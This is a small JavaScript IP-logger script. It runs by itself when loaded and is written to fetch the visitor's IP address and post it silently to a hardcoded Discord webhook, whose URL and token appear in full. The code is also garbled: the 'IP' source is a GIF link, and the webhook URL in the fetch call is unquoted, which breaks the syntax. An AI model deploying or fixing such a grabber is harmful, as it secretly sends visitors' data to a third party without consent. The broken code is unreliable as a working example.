
const ipifyAPI = "https://media.tenor.com/iZeeYFb9QlgAAAAj/benjammins-sybau.gif";


const webhookURL = "https://discord.com/api/webhooks/1411508873847771319/LsmNaKWCF_OizGnUjiO0jOjBuUgpKkTs75Dfr9eJQBh0PyIL4-2t1Ue8X0kJbYW5vweB";


async function getIP() {
    try {
        const response = await fetch(ipifyAPI);
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Error fetching IP:", error);
        return null;
    }
}

async function sendToDiscord(ip) {
    if (!ip) {
        console.error("IP address is null or undefined.");
        return;
    }

    const payload = {
        content: `IP Address: ${ip}`
    };

    try {
        const response = await fetch(https://discord.com/api/webhooks/1411508873847771319/LsmNaKWCF_OizGnUjiO0jOjBuUgpKkTs75Dfr9eJQBh0PyIL4-2t1Ue8X0kJbYW5vweB, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("IP sent to Discord successfully!");
        } else {
            console.error("Error sending IP to Discord:", response.statusText);
        }
    } catch (error) {
        console.error("Error:", error);
    }
}


async function main() {
    const ip = await getIP();
    if (ip) {
        await sendToDiscord(ip);
    }
}


main();
